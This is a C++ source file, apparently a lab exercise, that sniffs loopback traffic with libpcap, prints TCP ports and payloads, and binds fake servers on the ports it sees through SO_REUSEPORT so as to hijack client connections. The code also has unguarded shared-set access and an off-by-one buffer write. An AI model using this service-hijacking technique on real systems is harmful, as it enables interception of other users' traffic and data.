#include "header.h"
using namespace std;
void error(string s)
{
	perror(s.c_str());
	exit(1);
}
sem_t semaphore;
set<int> ports;
set<int> created_service;
struct thread_input
{
	int port;
	int sfd;
};

void printTCPHeader(const u_char *packet, int ipheadersize)
{
	struct tcphdr *tcpHeader = (struct tcphdr *)(packet + ETHER_HDR_LEN + ipheadersize);

	// cout << "TCP Header : ############################\n";
	cout << "    Source port : " << ntohs(tcpHeader->th_sport) << endl;
	cout << "    Destination port : " << ntohs(tcpHeader->th_dport) << endl;
	// cout << "    sequence : " << ntohl(tcpHeader->th_seq) << endl;
	// cout << "    acknowledge : " << ntohl(tcpHeader->th_ack) << endl;
	// cout << "    data offset : " << (tcpHeader->th_off << 2) << " Bytes" << endl;
	// cout << "    Flags : " << static_cast<int>(tcpHeader->th_flags) << endl;
	// cout << "    window size : " << ntohs(tcpHeader->th_win) << endl;
	// cout << "    chesksum : 0x" << hex << ntohs(tcpHeader->th_sum) << dec << endl;
	// cout << "    Urgent pointer : " << ntohs(tcpHeader->th_urp) << endl;
}

void *fake_service(void *arg)
{
	struct thread_input *in = (struct thread_input *)arg;
	int sfd = in->sfd;
	int port = in->port;

	struct sockaddr_in clientAddr;
	clientAddr.sin_family = AF_INET;
	int size = sizeof(clientAddr);
	cout << "FAKE SERVER THREAD READY FOR " << port << "\n\n";

	while (1)
	{
		int nsfd = accept(sfd, (struct sockaddr *)&clientAddr, (socklen_t *)&size);
		if (nsfd < 0)
			error("accept");

		char buf[1024];
		int n = recv(nsfd, buf, sizeof(buf), 0);
		if (n < 0)
			error("recv");
		else if (n == 0)
			continue;
		buf[n] = '\0';
		cout << "FAKE SERVER RECEIVED : " << buf << endl;
		cout << "client successfully stolen !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n\n\n";
		fflush(stdout);
	}
}
int ccccc = 0;
void capturedPacketHandler(u_char *userdata, const struct pcap_pkthdr *pkthdr, const u_char *packet)
{
	cout << "packet " << ++ccccc << endl;
	int packet_size = pkthdr->caplen;

	struct ip *ipHeader = (struct ip *)(packet + ETHER_HDR_LEN);

	struct tcphdr *tcpHeader = (struct tcphdr *)(packet + ETHER_HDR_LEN + (ipHeader->ip_hl << 2));
	int server_port = ntohs(tcpHeader->th_dport);

	//@ skipping printing if no data present
	if ((ETHER_HDR_LEN + (ipHeader->ip_hl << 2) + tcpHeader->th_off * 4 - packet_size) == 0)
		return;
	//@ skipping printing if sfd already created on that port
	if (created_service.find(server_port) != created_service.end())
		return;

	printTCPHeader(packet, ipHeader->ip_hl << 2);
	cout << "Payload (interpreted as a string): ";

	// take payload from correct starting point
	const u_char *payload = packet + ETHER_HDR_LEN + (ipHeader->ip_hl << 2) + (tcpHeader->th_off << 2);
	for (int i = 0; i < packet_size - (ETHER_HDR_LEN + (ipHeader->ip_hl << 2) + (tcpHeader->th_off << 2)); ++i)
	{
		cout << payload[i];
	}
	cout << "\nPacket Captured " << endl;
	cout << "found new server port : " << server_port << endl;
	fflush(stdout);

	sem_wait(&semaphore);
	ports.insert(server_port);
	sem_post(&semaphore);
}

void *pcap_start(void *arg)
{
	char errorBuf[PCAP_ERRBUF_SIZE];

	string device = "lo"; // take loopback interface as device

	// pcap handle for capturing packets
	pcap_t *handle = pcap_open_live(device.c_str(), BUFSIZ, PROMISCUOUS_MODE, 1000, errorBuf);
	if (handle == NULL)
		error("pcap_open_live");

	// Start packet capture loop and process packets
	if (pcap_loop(handle, 0, capturedPacketHandler, nullptr) < 0)
		error("pcap_loop");

	return NULL;
}

int main()
{
	pthread_t pcap_thread;
	if (pthread_create(&pcap_thread, NULL, pcap_start, NULL) < 0)
		error("pthread_create");

	cout << "sniffer thread created\n";
	if (sem_init(&semaphore, 0, 1) < 0)
		error("sem_init");

	while (1)
	{
		for (int port : ports)
		{
			// skip if already have sfd open at this port
			if (created_service.find(port) != created_service.end())
			{
				usleep(100000);
				continue;
			}

			int sfd = socket(AF_INET, SOCK_STREAM, 0);
			if (sfd < 0)
				error("socket");

			created_service.insert(port);

			int optval = 1;
			if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR | SO_REUSEPORT, &optval, sizeof(optval)) < 0)
				error("setsockopt");

			struct sockaddr_in addr;
			addr.sin_family = AF_INET;
			addr.sin_addr.s_addr = inet_addr("127.0.0.1");
			addr.sin_port = htons(port);

			if (bind(sfd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
				perror("bind");

			if (listen(sfd, 5) < 0)
				error("listen");

			pthread_t fake_server;
			struct thread_input *arg = new struct thread_input;
			arg->port = port;
			arg->sfd = sfd;

			if (pthread_create(&fake_server, NULL, fake_service, arg) < 0)
				error("pthread_create");
		}
	}

	return 0;
}
